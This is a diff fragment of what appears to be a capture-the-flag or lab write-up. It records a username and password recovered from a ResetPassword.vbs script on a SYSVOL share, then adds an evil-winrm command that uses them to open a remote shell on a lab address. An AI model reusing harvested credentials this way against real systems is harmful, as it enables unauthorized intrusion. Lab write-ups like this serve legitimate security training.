@@ -39,4 +39,7 @@ __SYSVOL -> ResetPassword.vbs__
 strUserNTName = "a-whitehat"
 strPassword = "bNdKVkjv3RR9ht"
 ```
-##### PSExec
+##### Evil-winrm 2.4
+```bash
+evil-winrm -u a-whitehat -p bNdKVkjv3RR9ht -i 10.10.179.93
+```
